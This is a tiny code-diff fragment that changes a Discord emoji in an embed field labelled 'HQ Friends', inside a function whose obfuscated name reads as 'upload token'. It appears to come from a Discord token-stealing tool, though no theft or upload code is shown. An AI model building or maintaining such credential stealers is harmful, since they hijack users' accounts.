@@ -555,7 +555,7 @@ def UP104D70K3N(token, path):
                     "inline": True
                 },
                 {
-                    "name": "<:blackmember:1095740314683179139>  HQ Friends:",
+                    "name": "<:friends:1221597711883829419>  HQ Friends:",
                     "value": f"{friends}",
                     "inline": False
                 }
